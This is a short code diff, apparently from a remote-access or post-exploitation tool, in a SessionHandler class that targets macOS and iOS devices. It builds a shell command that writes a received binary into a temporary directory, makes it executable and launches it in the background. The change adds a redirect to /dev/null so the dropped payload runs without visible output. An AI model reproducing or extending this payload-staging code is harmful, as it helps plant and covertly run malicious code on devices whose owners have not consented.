@@ -581,14 +581,14 @@ class SessionHandler:
             binaryFile = open(OSX_BINARY, "rb")
             payload = binaryFile.read()
             binaryFile.close()
-            preload = "rm /private/tmp/espl;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
+            preload = "rm /private/tmp/espl;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" > /dev/null &\n"
         elif "arm" in CDA:
             if verbose:
                 print strinfo("Detected iOS")
             binaryFile = open(iOS_BINARY, "rb")
             payload = binaryFile.read()
             binaryFile.close()
-            preload = "rm /private/var/tmp/espl;cat >/private/var/tmp/espl;chmod +x /private/var/tmp/espl;/private/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" &\n"
+            preload = "rm /private/var/tmp/espl;cat >/private/var/tmp/espl;chmod +x /private/var/tmp/espl;/private/var/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" > /dev/null &\n"
         elif "Linux" in CDA:
             if verbose:
                 print strinfo("Detected Linux, this isn't supported yet")
